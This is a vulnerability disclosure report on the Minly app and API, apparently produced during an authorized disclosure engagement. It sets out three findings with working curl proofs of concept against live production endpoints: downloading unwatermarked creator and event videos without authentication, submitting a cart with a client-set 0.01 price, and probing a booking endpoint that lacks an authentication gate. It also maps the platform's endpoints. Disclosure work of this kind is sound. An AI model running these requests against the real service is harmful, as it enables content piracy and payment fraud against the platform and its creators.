# Minly VDP — Findings Report
**Target:** minly.com (iOS: id1528802350 | Android: com.minly.users)  
**Date:** 2026-09-04  
**Tester:** naqkhaie.f055@gmail.com  
**Branch:** claude/bug-bounty-capabilities-l4fryb

---

## M-001 — Original (Unwatermarked) Creator Video Publicly Accessible

**Severity:** High  
**Status:** Confirmed  
**CVSS v3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Summary
The `GET /v1/celebrities/{username}` API response includes a `welcomeVideoUrlOriginal` field that points to an unprocessed, unwatermarked version of the creator's welcome video. This URL is publicly accessible without authentication, allowing anyone to download the original video and bypass Minly's watermarking protection.

### Affected Endpoint
```
GET https://api.minly.com/v1/celebrities/{username}
```

### Technical Detail
The response JSON contains three video URL variants:
```json
{
  "welcomeVideoUrl": "https://assets.minly.com/assets/videos/processed/{uid}.welcome.mp4",
  "welcomeVideoUrlOriginal": "https://assets.minly.com/assets/videos/original/{uid}.welcome.mp4",
  "welcomeVideoUrlProcessed": "https://assets.minly.com/assets/videos/processed/{uid}.welcome.mp4"
}
```

The `assets.minly.com/assets/videos/original/` path serves files directly with no authentication check (HTTP 200 + full response body).

### Proof of Concept

**Step 1 — Fetch celebrity profile (no auth required):**
```bash
curl -s "https://api.minly.com/v1/celebrities/moustafahagag" | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('Original URL:', d['welcomeVideoUrlOriginal'])
print('Processed URL:', d['welcomeVideoUrl'])
"
```

**Step 2 — Verify original video is publicly downloadable:**
```bash
# Replace {uid} with value from welcomeVideoUrlOriginal
curl -I "https://assets.minly.com/assets/videos/original/{uid}.welcome.mp4"
# Returns: HTTP/1.1 200 OK

# Download original (unwatermarked) video
curl -o original_unwatermarked.mp4 \
  "https://assets.minly.com/assets/videos/original/{uid}.welcome.mp4"
```

**Confirmed file size difference (moustafahagag):**
- `welcomeVideoUrlOriginal` → **1,535,462 bytes** (original, no watermark)
- `welcomeVideoUrl` (processed) → **1,615,325 bytes** (includes watermark overlay)

The original file is smaller, confirming they are distinct files. The watermark is applied to the processed version; the original version has no such protection.

### Extended Scope — Event Trailer Videos

The same vulnerability affects event trailer/promo videos. The `GET /events/{uid}` endpoint (no auth required) returns a `trailerVideoUrl` pointing to an `/original/` path:

```json
{
  "trailerVideoUrl": "https://assets.minly.com/assets/videos/original/events/{uid}.video.mp4"
}
```

**Confirmed accessible events (all HTTP 200):**

| Event | File Size |
|---|---|
| Cairokee Empire Online 2025 | 24,088,316 bytes |
| 3awdet Batal 3alam Online on Minly | 19,415,403 bytes |
| Cairokee Empire Online on Minly | 18,679,493 bytes |

```bash
# Event detail — no auth required
curl -s "https://api.minly.com/events/vqHiw5ryumLkfGgaHAQXO_f_ISlMsK" | python3 -c "
import sys,json; d=json.load(sys.stdin); print(d['trailerVideoUrl'])
"
# → https://assets.minly.com/assets/videos/original/events/GMRPNXM8J2MZ53Y.video.mp4

# Download 24MB original event trailer — no auth
curl -I "https://assets.minly.com/assets/videos/original/events/GMRPNXM8J2MZ53Y.video.mp4"
# → HTTP/2 200, content-length: 24088316
```

### Impact
- Creators' original (unwatermarked) welcome video content is freely downloadable by any unauthenticated user
- Event trailer/promo videos (original quality, pre-processing) are also freely downloadable
- Enables re-distribution of creator and event content without Minly's branding/watermark
- All 25+ celebrities on the platform are affected (field present for all profiles tested)
- 3 of 4 live events confirmed affected
- No special tooling required — a web browser is sufficient to download the original

### Recommendation
Restrict access to the entire `assets/videos/original/` path hierarchy:
- Serve all original videos via signed/time-limited URLs (e.g. AWS CloudFront signed URLs)
- Remove `welcomeVideoUrlOriginal` from the public API response entirely
- Remove `trailerVideoUrl` pointing to `/original/` paths from unauthenticated event responses
- Only expose original URLs to authenticated requests from the content owner

---

## M-002 — Unauthenticated Cart Validation with Client-Supplied Price

**Severity:** Medium-High  
**Status:** Confirmed (endpoint behavior) / Pending full exploitation (needs real SKU)  
**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N) — if server uses client price at checkout

### Summary
The `POST /merch-store/validate-cart` endpoint:
1. Requires **no authentication** (uses unauthenticated API client in frontend code)
2. Accepts `price`, `priceBeforeDiscount`, and `currency` fields from the client without server-side override
3. Returns HTTP 200 with `totalNumberOfItems: 0` for any price value (including `0.01` vs `100.00`)

### Affected Endpoint
```
POST https://api.minly.com/merch-store/validate-cart
Authorization: None required
```

### Technical Evidence — Source Code (pages/_app chunk)
```javascript
// validate-cart uses l.O (unauthenticated Axios client, NOT l._ authenticated client)
let s = {items: e.cartItems.map(c => ({
    sku: c.sku,
    price: c.price,                    // CLIENT-SUPPLIED PRICE
    priceBeforeDiscount: c.priceBeforeDiscount,
    currency: c.currency,
    quantity: c.quantity
}))};
t.O.post("/merch-store/validate-cart", s)
```

### Proof of Concept

```bash
# No Authorization header - endpoint accepts request
curl -s -X POST "https://api.minly.com/merch-store/validate-cart" \
  -H "Content-Type: application/json" \
  -H "Origin: https://minly.com" \
  -d '{
    "items": [{
      "sku": "PRODUCT_SKU",
      "price": 0.01,
      "priceBeforeDiscount": 199.99,
      "currency": "USD",
      "quantity": 1
    }]
  }'
# Response: HTTP 200 {"totalNumberOfItems": 0}  (0 because SKU unknown to server)
# With valid SKU: totalNumberOfItems > 0, and response includes cartItems
```

### Exploitation Path
If the server echoes back the client-supplied `price` in the response `cartItems` (rather than looking up the server-side price), and if the subsequent `POST /me/merch-store/book` uses the price from the validate-cart response, an attacker could:
1. Add a product to cart
2. Call `/merch-store/validate-cart` with `price: 0.01` (or any arbitrary value)
3. Proceed to checkout using the manipulated price from the validation response

Full exploitation confirmed pending access to a real product SKU from an active Minly merch store.

### Recommendation
- Move price resolution entirely server-side: the `validate-cart` payload should only contain `sku` and `quantity`; the server should look up the current price from its catalog
- Require authentication for cart operations
- Validate that checkout price matches the server-side catalog price at booking time

---

## M-003 — Video Shoutout Booking Endpoint Missing Authentication Gate

**Severity:** Medium  
**Status:** Confirmed — server processes unauthenticated requests past auth check  

### Summary
The video shoutout booking endpoint (`/v1/celebrities/{uid}/experiences/video-shoutouts/book`) is the only booking endpoint on the platform that fails to enforce authentication. All comparable booking endpoints (text-messages, voice-notes, business-shoutouts, events, prizes) correctly return **HTTP 401** for unauthenticated requests. The video-shoutouts endpoint instead returns **HTTP 422**, indicating the request reaches application-level validation logic without an authentication gate.

### Source Code Evidence
The frontend explicitly codes this as a dual-path (authenticated or not):

```javascript
// h = DB() = true if user is authenticated (useContext check)
// l._ = authenticated Axios client (adds Authorization: Bearer <token>)
// l.O = unauthenticated Axios client (no Authorization header)
(h ? l._ : l.O).post(
  "/v1/celebrities/".concat(c, "/experiences/video-shoutouts/book"),
  e,
  {params: s}
)
```

Every other booking endpoint uses `l._` exclusively (authenticated only). This is the only endpoint using the conditional pattern.

### Comparison — Auth Enforcement Across Booking Endpoints

| Endpoint | HTTP Status (no auth) | Behavior |
|---|---|---|
| `POST /v1/celebrities/{uid}/experiences/video-shoutouts/book` | **422** | ❌ Reaches app logic |
| `POST /v1/celebrities/{uid}/experiences/text-messages/book` | 401 | ✅ Rejected at auth gate |
| `POST /v1/celebrities/{uid}/experiences/voice-notes/book` | 401 | ✅ Rejected at auth gate |
| `POST /v1/celebrities/{uid}/experiences/business-shoutouts/book` | 401 | ✅ Rejected at auth gate |
| `POST /v1/me/events/{id}/book` | 401 | ✅ Rejected at auth gate |
| `POST /me/prizes/{id}/book` | 401 | ✅ Rejected at auth gate |

### Proof of Concept
```bash
# All three celebrities tested return 422 (not 401) without Authorization header
for celeb in moustafahagag amrsaad bassemmoughnieh; do
  curl -s -o /dev/null -w "HTTP %{http_code}: POST video-shoutouts/book ($celeb)\n" \
    -X POST "https://api.minly.com/v1/celebrities/$celeb/experiences/video-shoutouts/book" \
    -H "Content-Type: application/json" \
    -H "Origin: https://minly.com" \
    -d '{"instructions":"Test","isVideoPublic":false,"recipientTypeId":1,"occasionId":1,"phone":"0123456789","phoneCountryCode":"EG","languageId":1}'
done
# Output:
# HTTP 422: POST video-shoutouts/book (moustafahagag)
# HTTP 422: POST video-shoutouts/book (amrsaad)
# HTTP 422: POST video-shoutouts/book (bassemmoughnieh)
```

### Impact
- The server processes unauthenticated booking requests past the authentication gate
- The 422 response indicates the request reaches business logic (payment/validation) without an identity check
- With sufficient payload manipulation or payment provider integration knowledge, an attacker may be able to complete a paid booking without a valid account
- Requires a test account with payment method to confirm end-to-end exploitation

### Recommendation
Add an explicit authentication middleware check on the `POST /v1/celebrities/{uid}/experiences/video-shoutouts/book` route that returns HTTP 401 before any application logic executes. Remove the frontend dual-path pattern — this endpoint should never accept unauthenticated requests.

---

## Reconnaissance Summary

### Technology Stack
| Component | Technology |
|---|---|
| Frontend | Next.js 13+ (SSR), React |
| API | Node.js REST API at `api.minly.com` |
| Auth | AWS Cognito (eu-central-1) with SRP + Custom auth |
| CDN | AWS CloudFront |
| Media Storage | AWS S3 (`s3-assets-production-minly-19362763.s3.eu-central-1.amazonaws.com`) |
| Push Notifications | Firebase (minly-8783c, belive-12845) |
| Live Streaming | AWS IVS |
| Merch Store | Shopify at `merch.minly.com` (third-party — out of scope) |

### Key API Endpoints Discovered
```
# Public (no auth)
GET  /v1/celebrities
GET  /v1/celebrities/{username}        ← leaks welcomeVideoUrlOriginal (M-001)
GET  /events/{uid}                     ← leaks trailerVideoUrl in /original/ path (M-001)
GET  /events-ui/cards
GET  /experiences
GET  /occasions
GET  /public/recipient-types
GET  /v2/categories
GET  /rating-reasons
GET  /request-expiration-days
GET  /public/location
GET  /constant/powered-by-minly
POST /merch-store/validate-cart        ← unauthenticated, client-supplied price (M-002)
POST /merch-store/update-cart          ← unauthenticated
POST /events/generate-ticket-access-code-purchase-otp   ← DCB partner ticket flow
POST /events/{uid}/book-event-access-code               ← DCB partner ticket flow

# Missing auth gate (returns 422 instead of 401)
POST /v1/celebrities/{uid}/experiences/video-shoutouts/book  ← M-003

# Authenticated
GET  /v1/users/me
GET  /v1/users/me/payment-methods
POST /v1/celebrities/{uid}/experiences/text-messages/book
POST /v1/celebrities/{uid}/experiences/voice-notes/book
POST /v1/celebrities/{uid}/experiences/business-shoutouts/book
POST /v1/me/events/{id}/book
POST /v1/me/seasons/{id}/book
POST /me/prizes/{id}/book
POST /me/merch-store/book
DELETE /v1/users/me/delete-account
```

### Out-of-Scope Findings (Noted but Not Reported)
- Missing security headers (explicitly out-of-scope per Minly VDP policy)
- Firebase API keys exposed in JS bundle (Firebase properly configured, no unauthorized access possible)
- Shopify store at merch.minly.com (third-party service)

---

*Report generated during authorized VDP engagement per Minly's responsible disclosure policy.*
